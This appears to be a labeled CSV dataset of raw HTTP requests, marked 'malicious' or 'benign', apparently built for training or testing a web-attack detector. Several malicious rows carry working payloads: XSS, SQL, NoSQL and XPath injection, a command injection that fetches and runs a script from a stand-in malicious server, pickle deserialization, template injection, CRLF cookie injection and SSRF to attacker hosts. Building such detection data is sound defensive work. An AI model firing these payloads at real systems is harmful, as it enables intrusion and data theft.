label,text
malicious,"POST /api/metadata/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 351
Origin: https://dashboard.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""session_update"",
  ""updateField"": ""location"",
  ""location"": ""us-west-2"",
  ""userId"": ""user_934857"",
  ""authToken"": ""NTFjMWQ2YzQtZTg2OS00ZDQyLWJiMWItMzNkNjY4YTAxOThl""
}"
benign,"PUT /api/v5/employees/3592 HTTP/1.1
Host: hr-centralized-app.biz
Authorization: Bearer eyJhbGc1NiJ9.eyJlbXAiOiJlbXAwOElvIn0.lO2PnUwWXaho2XqYABtKtg
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Length: 144

{""id"":3592,""first_name"":""Alyssa"",""last_name"":""Nguyen"",""department"":""Marketing"",""email"":""alyssa.nguyen@hr-centralized-app.biz"",""status"":""active""}"
malicious,"POST /api/executeTask HTTP/1.1
Host: control-node.central-iot.solutions
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 128
Connection: keep-alive

{""taskId"":""update_firmware"",""targetHost"":""192.168.5.10 && curl http://malicious-server.net/exploit.sh | sh"",""priority"":7}"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: api.cloud-data-services.ai
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
User-Agent: curl/7.83.1
Origin: https://portal.cloud-data-services.ai
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization"
benign,"GET /downloads/legal/terms_conditions_update.pdf HTTP/1.1
Host: secure-user-portal.net
Accept: application/pdf
Referer: https://secure-user-portal.net/account/settings
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Language: en-US,en;q=0.9"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 292
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""theme"": ""dark"", ""notifications"": true}, ""version"": ""1.4.6"", ""locale"": ""en-US""}, ""system_flags"": {""auto_update"": false, ""send_reports"": true}}}"
malicious,"GET /track?user=admin%0d%0a127.0.0.1 - admin [09/Jun/2024:12:00:00 +0000] ""GET /track?user=admin HTTP/1.1"" 200 2048 HTTP/1.1
Host: logs.online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate"
benign,"GET /contents/filter?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
X-Requested-With: XMLHttpRequest
Referer: https://community.game-dev-forum.org/dashboard
Connection: keep-alive"
benign,"DELETE /api/v1/sessions/5f62d1e7 HTTP/1.1
Host: secure-access-manager.org
Authorization: Bearer pa9za2kmog1q8twne6svrbhxclj4fdyu
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Cache-Control: no-store
Connection: close"
malicious,"GET /products/item/details?item_code=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: tech-marketplace.store
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: keep-alive
Cookie: device_id=837bc2a0-bea4-4e72-b573-7e0d5495d220; lastLogin=1623252800"
benign,"HEAD /media/movies/launch_trailer_4k.mov HTTP/1.1
Host: global-streaming-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /profile/settings/theme.js HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/javascript, */*;q=0.8
Referer: https://secure-user-portal.net/dashboard/home"
benign,"GET /static/v3/css/light-theme.min.css HTTP/1.1
Host: smart-home-control.ai
Accept: text/css,*/*;q=0.1
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
User-Agent: curl/7.87.0
Connection: close"
malicious,"POST /session/update HTTP/1.1
Host: auth.enterprisecloud-dash.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Content-Type: text/plain
Content-Length: 92
Cache-Control: no-cache
Cookie: sessionid=2ade3f8a4be34a0ea029db2f1ecb6b54

user%5Bemail%5D=enterprise_user%40enterprisecloud-dash.net&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=12&user%5Broles%5D%5B%5D=15"
benign,"DELETE /api/v1/blog/articles/71d23e HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer O3IZeP4SQaxJ5qGkYbErTcF18XdlWM9fjLvPHzN0
Accept: application/json
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /downloads/../images/logo.png HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/resources"
benign,"GET /products;category=books/featured HTTP/1.1
Host: urban-reading-hub.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
benign,"POST /v1/chat/conversation/messages HTTP/1.1
Host: messenger-app-cloud.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 109
Connection: close

{""messages"":[""Hello, how are you?"",""Did you get my last message?"",""Looking forward to our meeting."",""Please confirm the schedule.""]}"
benign,"GET /api/v1/invoices/INV-9821.xml HTTP/1.1
Host: finance-ops-solutions.io
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123def456ghi789
Connection: keep-alive"
benign,"GET /forum/thread/%E4%BC%9A%E8%AD%B0%E8%AB%96%E5%A3%87 HTTP/1.1
Host: community-tech-talk.jp
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: ja-JP,ja;q=0.9,en-US;q=0.7,en;q=0.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community-tech-talk.jp/forums"
benign,"GET /products/fitness-wearables/smartwatch-pro HTTP/1.1
Host: urban-sports-gear.com
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /upload/photo HTTP/1.1
Host: personal-cloud-drive.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Accept: application/json
Referer: https://personal-cloud-drive.net/photos/upload
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36
Connection: keep-alive

title=Summer%20Vacation%20%232023&description=Photo%20with%20friends%20%26%20family%20%25memories&tags=holiday%2Cbeach%2Cfun"
benign,"POST /auth/login HTTP/1.1
Host: apps.customer-portal.cloud
Content-Type: application/json
Accept: application/json
Origin: https://apps.customer-portal.cloud
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Length: 79

{""username"":""lisa.turner"",""password"":""N3wH0riz0n!27""}"
benign,"GET /products;category=books;genre=history/top-sellers HTTP/1.1
Host: elite-book-store.net
User-Agent: curl/7.79.1
Accept: */*
Accept-Encoding: deflate, gzip
Connection: keep-alive"
benign,"GET /search?q=how%20to%20bake%20bread HTTP/1.1
Host: hobby-cooks-network.org
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
X-Forwarded-For: 203.0.113.34"
malicious,"GET /service/command HTTP/1.1
Host: command-handler.internal-tech.ai
User-Agent: Python-requests/2.25.1
Accept: */*
X-Pickle: \x80\x03c__builtin__\nsystem\n\x85\x94\x8c\x0ewhoami\x94\x85\x94R.\r"
benign,"GET /api/v3/items/search?category=books&author=adam+grant HTTP/1.1
Host: knowledge-portal.org
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: python-requests/2.28.2
Connection: keep-alive
X-Forwarded-For: 172.58.214.11"
benign,"GET /attachment/getfile?file=report-final.pdf HTTP/1.1
Host: community.forum-files.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/pdf
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://community.forum-files.org/thread/3456"
malicious,"GET /user/settings?theme=dark%250d%250aSet-Cookie%3A%20adminAccess%3Dyes HTTP/1.1
Host: analytics-saas-platform.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /api/inventory HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.example.token.part
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Length: 112
Connection: keep-alive

{""sku"":""ELEC-3578"",""name"":""Smart Home Speaker"",""price"":129.99,""stock"":150,""categories"":[""electronics"",""home""]}"
benign,"GET /dashboard/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: admin-management.cloud-ops-platform.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Referer: https://admin-management.cloud-ops-platform.io/dashboard
Upgrade-Insecure-Requests: 1"
benign,"GET /articles/2024/05/benefits-of-electric-vehicles HTTP/1.1
Host: urban-mobility-trends.tech
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"POST /auth/logout HTTP/1.1
Host: dailynews-portal.com
Referer: https://dailynews-portal.com/dashboard
Cookie: sessionid=10ebf4cc94d55b2f
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 0
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
User-Agent: curl/7.77.0
Referer: https://api.cloud-data-services.ai/query{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id -un').read() }} #}
Accept: */*
Content-Length: 38
X-Requested-With: XMLHttpRequest

{""searchTerm"":""laptop"",""maxResults"":5}"
malicious,"GET /api/users/lookup?username=admin&password%5B%24ne%5D=1234 HTTP/1.1
Host: data-analytics-portal.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /catalog/item?search_term=12%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: secure-user-portal.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Wget/1.21.1
Cookie: sessionid=0d9f51a4cf1c476ebbfa4dcad190d481; csrf_token=abcde12345"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: api.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
X-Notification-Endpoint: http://rebind-ssrf.attacker-network.io/notify
Cookie: auth_token=9f4e27b6dcb4a8e2f7b1c3d5e6a7f8b9
Content-Length: 42

{""email_notifications"":true,""theme"":""dark""}"
benign,"GET /profile/user4521 HTTP/1.1
Host: socialcircle-forums.org
Connection: close
Accept: text/html
Referer: https://socialcircle-forums.org/home
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; preference=darkmode
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
benign,"POST /api/v1/profile/avatar HTTP/1.1
Host: user-media-hub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 184
Connection: keep-alive

{""userId"": ""4721b89c"", ""avatarImage"": ""iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQBwYWludC5uZXQgNC4xLjNNZMx+AAABfUlEQVR4nO3QMQ6EIAwFUfyT3P//Mz72MsLSUWOlS1uuDAiCJ2Di8RwYsAiFwEEiAcBAIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAg6M0Gv+9G4M/BXLixu7yTnOdr4Hkyt38dqXm6HlYKjxtm6leda/v7q5slbzoHOAMbFV/pfTyYOXAOLKnkzZVodXGMPfMEFDNnIEp0SxgRyoLrI2neX8owkI0LpHThLQbyY4AZ89EpLJX5HXnH2vx4/02qvAatuSL+dmW/5Z9ggrNCl7Le/aFaPjsk5ojTj2O+XjicoHZlYWzGsi0qTg3RIrBJsBQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQIgHAQiJ/B4BXnlwfQY3hQQAAAABJRU5ErkJggg==""}"
benign,"POST /events/rsvp HTTP/1.1
Host: cityculturespace.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
Origin: https://cityculturespace.io
Referer: https://cityculturespace.io/events/2023
Connection: keep-alive
Cookie: sessionid=XY89Qlafn20F8tu9v1W;

event_id=4821&attending=yes&seating=balcony"
malicious,"GET /profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Cookie: session_filter=(auth=superuser%00;"
benign,"GET /api/customers/list.xml HTTP/1.1
Host: customer-insights-analytics.io
Accept: text/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Authorization: Basic Y3VzdG9tZXI6bG9naW5wYXNz
Cache-Control: max-age=0"
malicious,"POST /profile/settings/validate HTTP/1.1
Host: user-authentication-hub.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Referer: https://user-authentication-hub.org/profile/settings
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
benign,"GET /js/vendor/lodash.min.js HTTP/1.1
Host: trusted-data-aggregator.tech
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: application/javascript
Referer: https://trusted-data-aggregator.tech/analytics/dashboard
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8"
malicious,"POST /upload/image HTTP/1.1
Host: media-content-host.online-retail-store.biz
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Notification-Endpoint: http://rebind-callback-ssrf.attacker-domain.org/upload
Content-Length: 27

imageName=summer_vacation.jpg&tag=beach"
benign,"GET /resource/load?path=images/gallery/event_spring2024/banner.jpg HTTP/1.1
Host: creative-media-archive.ai
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://creative-media-archive.ai/gallery/event_spring2024 HTTP/1.1
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"OPTIONS /rest/v1/shops/9231 HTTP/1.1
Host: ecommerce-hub360.biz
Origin: https://admin.marketworkflow.store
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Access-Control-Request-Headers: authorization
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /blog/post/2024/04/17/edit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
If-Match: ""1a2b3c4d5e6f7g8h9i0j""
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json
Authorization: Bearer abcdef1234567890abcdef1234567890
Content-Length: 171

{""title"":""Spring Walks Updated"",""tags"":[""nature"",""photography"",""spring""],""content"":""Updated content with new photos from the park walk.""}"
malicious,"GET /app/user/settings?title=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://api.cloud-data-services.ai/dashboard
Connection: keep-alive"
benign,"GET /feed/rss.xml HTTP/1.1
Host: cinephile-verse.biz
Accept: application/rss+xml
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Referer: https://cinephile-verse.biz/new-releases
Connection: keep-alive
Accept-Language: en-US,en;q=0.8"
malicious,"GET /service/status/device123%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: close"
malicious,"GET /login?redirect=%2Fhome%3Fsession%3Dactive%250d%250aSet-Cookie%3A%20isAdmin%3Dtrue%3B%20HttpOnly%3B%20Secure HTTP/1.1
Host: user-access-portal.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://user-access-portal.co.uk/login
Cache-Control: max-age=0"
benign,"POST /user/settings/profile HTTP/1.1
Host: bright-minds-learning.edu
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://bright-minds-learning.edu
Referer: https://bright-minds-learning.edu/user/settings/profile
Cookie: session=78236947; user_pref=math
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

display_name=Dr.+Lisa+Grant&bio=Mathematics+professor+and+education+enthusiast.&website_url=https%3A%2F%2Flisagrantmath.edu&location=Boston%2C+MA"
benign,"GET /shopping/cart?id=84 HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Referer: https://online-retail-store.biz/products/electronics
Accept-Encoding: gzip, deflate"
benign,"GET /recipes/search?query=how%20to%20bake%20bread HTTP/1.1
Host: theculinaryvault.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://theculinaryvault.net/recipes/latest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Connection: keep-alive
Cache-Control: no-cache"
malicious,"POST /api/v2/search/items HTTP/1.1
Host: api.product-catalogue.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/xml, text/xml, */*
Content-Type: application/xml
Content-Length: 130
Connection: keep-alive

<searchRequest>
  <term>' or count(//*) > 0 or ''='</term>
  <category>all</category>
</searchRequest>"
benign,"POST /blog/comment/add HTTP/1.1
Host: literate-ideas.blog-spotlight.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
Cache-Control: max-age=0
Referer: https://literate-ideas.blog-spotlight.info/posts/how-to-write-better

name=Linda+Roy&email=linda.roy%40mailservice.com&comment=I+love+the+tips+about+writing+style+%26+avoiding+common+errors+%23appreciate-it%21"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 94
Origin: https://community.game-dev-forum.org
Cookie: session=wbFs83jqMl20HdF9

theme=dark';%20db.users.update({username:%27admin%27},%20{$set:{isAdmin:true}});%20//&notifications=true"
benign,"POST /api/posts HTTP/1.1
Host: creative-authors-hub.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.aGVsbG9Xb3JsZA.
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Length: 109
Connection: keep-alive

{""title"":""Evening Reflections"",""content"":""Today I explored the city parks and enjoyed a peaceful afternoon."",""tags"":[""personal"",""journal""],""visibility"":""public""}"
